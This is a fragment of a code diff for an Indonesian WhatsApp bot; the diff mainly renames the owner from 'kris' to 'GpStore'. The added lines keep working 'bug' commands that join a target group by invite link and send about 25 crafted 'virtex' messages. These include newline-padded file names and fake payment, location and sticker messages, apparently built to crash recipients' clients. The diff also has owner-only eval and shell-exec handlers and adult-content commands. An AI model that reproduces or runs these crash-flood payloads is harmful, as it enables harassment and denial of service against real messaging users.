 var sticker = generateWAMessageFromContent(from,proto.Message.fromObject({stickerMessage: {url: 'https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc',fileSha256: 'YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=',fileEncSha256: '9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=',mediaKey: 'nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=',mimetype: 'image/webp',height: 64,width: 64,directPath: '/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781',fileLength: '7774',mediaKeyTimestamp: '1657290167',isAnimated: false,},}),{ userJid: from, quoted: lep })
-var liveLocation = generateWAMessageFromContent(from,proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: `ৡৢ͜͡𝟒𝟎𝟒-kris ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),{ userJid: from, quoted: lep })
+var liveLocation = generateWAMessageFromContent(from,proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: `ৡৢ͜͡𝟒𝟎𝟒-GpStore ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),{ userJid: from, quoted: lep })
 for (let i = 0; i < jumlah; i++) {
-kris.relayMessage(numt, buginvite.message, { messageId: buginvite.key.id })
-kris.relayMessage(numt, { requestmentMessage: { Message: { TextMessage: { text: '', currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
-kris.relayMessage(numt, pollCreation.message, { messageId: pollCreation.key.id })
-kris.relayMessage(numt, order.message, { messageId: order.key.id })
-kris.relayMessage(numt, audio.message, { messageId: audio.key.id })
-kris.relayMessage(numt, image.message, { messageId: image.key.id })
-kris.relayMessage(numt, document.message, { messageId: document.key.id })
-kris.relayMessage(numt, liveLocation.message, { messageId: liveLocation.key.id })
-kris.relayMessage(numt, sticker.message, { messageId: sticker.key.id })
-kris.sendKatalog(numt, `ৡৢ͜͡𝟒𝟎𝟒-kris ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-kris ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ppnyaimg, { quoted: lep })
-kris.sendMessage(numt, { text: '', templateButtons: [{ callButton: { displayText: `P`, phoneNumber: ``}},{ urlButton: { displayText: `P`, url: `https://wa.me/`}},{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},]})
+GpStore.relayMessage(numt, buginvite.message, { messageId: buginvite.key.id })
+GpStore.relayMessage(numt, { requestmentMessage: { Message: { TextMessage: { text: '', currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
+GpStore.relayMessage(numt, pollCreation.message, { messageId: pollCreation.key.id })
+GpStore.relayMessage(numt, order.message, { messageId: order.key.id })
+GpStore.relayMessage(numt, audio.message, { messageId: audio.key.id })
+GpStore.relayMessage(numt, image.message, { messageId: image.key.id })
+GpStore.relayMessage(numt, document.message, { messageId: document.key.id })
+GpStore.relayMessage(numt, liveLocation.message, { messageId: liveLocation.key.id })
+GpStore.relayMessage(numt, sticker.message, { messageId: sticker.key.id })
+GpStore.sendKatalog(numt, `ৡৢ͜͡𝟒𝟎𝟒-GpStore ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-GpStore ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ppnyaimg, { quoted: lep })
+GpStore.sendMessage(numt, { text: '', templateButtons: [{ callButton: { displayText: `P`, phoneNumber: ``}},{ urlButton: { displayText: `P`, url: `https://wa.me/`}},{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},]})
 }
 }
 break
 case 'sendbug':{
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 if (!q) return reply(`Contoh ${prefix+command} linkgc`)
 if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
 let result = args[0].split('https://chat.whatsapp.com/')[1]
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-let kir = await kris.groupAcceptInvite(result)
-kris.relayMessage(kir, {
+let kir = await GpStore.groupAcceptInvite(result)
+GpStore.relayMessage(kir, {
 requestmentMessage: { 
 Message: { 
 extendedTextMessage: { 
-text: `kris Bot ${virus}${virtex(prefix)}`, 
+text: `GpStore Bot ${virus}${virtex(prefix)}`, 
 currencyCodeIso4217: 'IDR', 
 requestFrom: '0@s.whatsapp.net', 
 expiryTimestamp: 8000, 
@@ -2981,16 +2981,16 @@ reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
 case 'senddoc':{
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 if (!q) return reply(`Contoh ${prefix+command} linkgc`)
 if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
 let result = args[0].split('https://chat.whatsapp.com/')[1]
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-let kir = await kris.groupAcceptInvite(result)
-kris.sendMessage(kir, { 
+let kir = await GpStore.groupAcceptInvite(result)
+GpStore.sendMessage(kir, { 
 document: ppnyaimg, 
-fileName: `🔥 kris BOT ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
+fileName: `🔥 GpStore BOT ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
 mimetype: `application/txt`, 
 jpegThumbnail: ppnyaimg, 
 mentions:[sender] }, {quoted:lep})
@@ -3000,24 +3000,24 @@ reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
 case 'sendloc':{
-if (!itsMekris) return reply(mess.owner)
+if (!itsMeGpStore) return reply(mess.owner)
 if (!q) return reply(`Contoh ${prefix+command} linkgc`)
 if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
 let result = args[0].split('https://chat.whatsapp.com/')[1]
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-let kir = await kris.groupAcceptInvite(result)
-var messa = await prepareWAMessageMedia({ image: ppnyaimg }, { upload: kris.waUploadToServer })
+let kir = await GpStore.groupAcceptInvite(result)
+var messa = await prepareWAMessageMedia({ image: ppnyaimg }, { upload: GpStore.waUploadToServer })
 var location = generateWAMessageFromContent(kir, proto.Message.fromObject({
 "locationMessage": {
 "degreesLatitude": -6.936928157735237,
 "degreesLongitude": 107.72270679473877,
-"name": `kris Bot WhatsApp ${virus}`,
-"address": `Created By kris ${virtex(prefix)}`,
+"name": `GpStore Bot WhatsApp ${virus}`,
+"address": `Created By GpStore ${virtex(prefix)}`,
 "jpegThumbnail": messa.imageMessage,
 }
 }), { userJid: from, quoted: lep })
-kris.relayMessage(kir, location.message, { messageId: location.key.id })
+GpStore.relayMessage(kir, location.message, { messageId: location.key.id })
 await sleep(1000)
 }
 reply(`Sukses Send Bug Sebanyak ${jumlah}`)
@@ -3081,7 +3081,7 @@ case 'glue':
 case '1917': 
 case 'leaves': {
 if (!isPrem) return replyprem(mess.premium)
-if (!q) return reply(`Example : ${prefix+command} kris`) 
+if (!q) return reply(`Example : ${prefix+command} GpStore`) 
 let link
 if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
 if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
@@ -3141,7 +3141,7 @@ if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-
 if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
 if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
 let anu = await textpro.textpro(link, q)
-kris.sendMessage(m.chat, { image: { url: anu }, caption: `${mess.succes}` }, { quoted: m })
+GpStore.sendMessage(m.chat, { image: { url: anu }, caption: `${mess.succes}` }, { quoted: m })
 }
 break
 case 'glitchtext':
@@ -3175,7 +3175,7 @@ case 'freecreate':
 case 'galaxystyle':
 case 'lighteffects':{
 if (!isPrem) return replyprem(mess.premium)
-if (!q) return reply(`Example : ${prefix+command} kris`) 
+if (!q) return reply(`Example : ${prefix+command} GpStore`) 
 let link
 if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
 if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
@@ -3208,7 +3208,7 @@ if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3
 if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
 if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
 let haldwhd = await ephoto(link, q)
-kris.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.succes}` }, { quoted: m })
+GpStore.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.succes}` }, { quoted: m })
 }
 break
 case 'shadow': 
@@ -3239,7 +3239,7 @@ case 'naturetypography':
 case 'quotesunder':
 case 'shinetext':{
 if (!isPrem) return replyprem(mess.premium)
-if (!q) return reply(`Example : ${prefix+command} kris`) 
+if (!q) return reply(`Example : ${prefix+command} GpStore`) 
 let link
 if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
 if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
@@ -3269,7 +3269,7 @@ if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-e
 if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
 if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
 let dehe = await photooxy.photoOxy(link, q)
-kris.sendMessage(m.chat, { image: { url: dehe }, caption: `${mess.succes}` }, { quoted: m })
+GpStore.sendMessage(m.chat, { image: { url: dehe }, caption: `${mess.succes}` }, { quoted: m })
 }
 break
 case 'aesthetic': case 'ahegao': case 'akira': case 'akiyama': case 'ana': case 'anjing': case 'art': case 'ass': case 'asuna': case 'ayuzawa': case 'bdsm': case 'boneka': case 'boruto': case 'bts': case 'cecan': case 'chiho': case 'chitoge': case 'cogan': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cuckold': case 'cum': case 'cyber': case 'darkjokes': case 'deidara': case 'doraemon': case 'eba': case 'elaina': case 'emilia': case 'ero': case 'erza': case 'exo': case 'femdom': case 'foot': case 'freefire': case 'gamewallpaper': case 'gangbang': case 'gifs': case 'glasses': case 'gremory': case 'hekel': case 'hentai': case 'hestia': case 'hijaber': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jahy': case 'jeni': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'kartun': case 'katakata': case 'keneki': case 'kotori': case 'kpop': case 'kucing': case 'kurumi': case 'lisa': case 'loli': case 'madara': case 'masturbation': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'milf': case 'minato': case 'mobil': case 'motor': case 'mountain': case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'orgy': case 'panties': case 'pentol': case 'pokemon': case 'profil': case 'programming': case 'pubg': case 'pussy': case 'randblackpink': case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'ryujin': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'tatasurya': case 'technology': case 'tejina': case 'tentacles': case 'thighs': case 'toukachan': case 'tsunade': case 'waifu': case 'wallhp': case 'wallml': case 'wallnime': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
@@ -3409,7 +3409,7 @@ jpegThumbnail: ppnyaimg,
 caption: `Nih Kak @${sender.split("@")[0]}`,
 fileLength: "999999999999",
 mentions: [sender],
-footer: `Powered By kris`,
+footer: `Powered By GpStore`,
 buttons: buttoons,
 headerType: 4,
 contextInfo: {
@@ -3425,7 +3425,7 @@ contextInfo: {
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }}
 }
-kris.sendMessage(m.chat, buttonMessaage, { quoted: m })
+GpStore.sendMessage(m.chat, buttonMessaage, { quoted: m })
 }
 break
 case 'fox':  
@@ -3437,13 +3437,13 @@ case 'koala':
 if (!isPrem) return replyprem(mess.premium)
 neys = await fetchJson(`https://some-random-api.ml/img/${command}`)
 anu1 = await getBuffer(neys.link)
-kris.sendMessage(m.chat, { image: anu1, caption: `${mess.succes}` }, { quoted : m })
+GpStore.sendMessage(m.chat, { image: anu1, caption: `${mess.succes}` }, { quoted : m })
 break
 case 'jjmeryani':{
 if (!isPrem) return replyprem(mess.premium)
 let kaydt = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/meryani.json')
 let hayu = kaydt[Math.floor(Math.random() * kaydt.length)];
-kris.sendMessage(m.chat,{video:{url:hayu},caption:`${mess.succes}`},{quoted: m})
+GpStore.sendMessage(m.chat,{video:{url:hayu},caption:`${mess.succes}`},{quoted: m})
 }
 break
 case 'cerpen_anak':{
@@ -3595,9 +3595,9 @@ let jptpgr = await cerpen(`korea`)
 reply(`�? _*Title :*_ ${jptpgr.title}\n�? _*Author :*_ ${jptpgr.author}\n�? _*Category :*_ ${jptpgr.kategori}\n�? _*Pass Moderation :*_ ${jptpgr.lolos}\n�? _*Story :*_\n${jptpgr.cerita}`)
 }
 break
-case 'cerpen_kristen':{
+case 'cerpen_GpStoreten':{
 if (!isPrem) return replyprem(mess.premium)
-let yesusanjing = await cerpen(`kristen`)
+let yesusanjing = await cerpen(`GpStoreten`)
 reply(`�? _*Title :*_ ${yesusanjing.title}\n�? _*Author :*_ ${yesusanjing.author}\n�? _*Category :*_ ${yesusanjing.kategori}\n�? _*Pass Moderation :*_ ${yesusanjing.lolos}\n�? _*Story :*_\n${yesusanjing.cerita}`)
 }
 break
@@ -3759,7 +3759,7 @@ reply(`�? _*Title :*_ ${xwpwifj.title}\n�? _*Author :*_ ${xwpwifj.author}\n�
 break
 case '>':
 case '=>':
-if (!itsMekris) return;
+if (!itsMeGpStore) return;
 var err = new TypeError;
 err.name = "EvalError "
 err.message = "Code Not Found (404)"
@@ -3782,7 +3782,7 @@ reply(util.format(_syntax + _err))
 break
 default:
 if (budy.startsWith('<')) {
-if (!itsMekris) return
+if (!itsMeGpStore) return
 try {
 return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
 } catch (e) {
@@ -3791,7 +3791,7 @@ reply(e)
 }
 
 if (budy.startsWith('vv')) {
-if (!itsMekris) return
+if (!itsMeGpStore) return
 try {
 let evaled = await eval(budy.slice(2))
 if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
@@ -3802,7 +3802,7 @@ reply(String(err))
 }
 
 if (budy.startsWith('uu')){
-if (!itsMekris) return
+if (!itsMeGpStore) return
 qur = budy.slice(2)
 exec(qur, (err, stdout) => {
 if (err) return reply(`${err}`)
@@ -3832,14 +3832,14 @@ if (m.chat.endsWith('broadcast')) return
 if (m.isBaileys) return
 let msgs = global.db.database
 if (!(budy.toLowerCase() in msgs)) return
-kris.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
+GpStore.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
 }
 }
 
 } catch (err) {
 console.log(util.format(err))
 let e = String(err)
-kris.sendMessage("62882007324217@s.whatsapp.net", { text: "Hallo Owner Sepertinya Ada Yang Error Harap Di Perbaiki " + util.format(e), 
+GpStore.sendMessage("62858428854987@s.whatsapp.net", { text: "Hallo Owner Sepertinya Ada Yang Error Harap Di Perbaiki " + util.format(e), 
 contextInfo:{
 forwardingScore: 5, 
 isForwarded: true𝙭
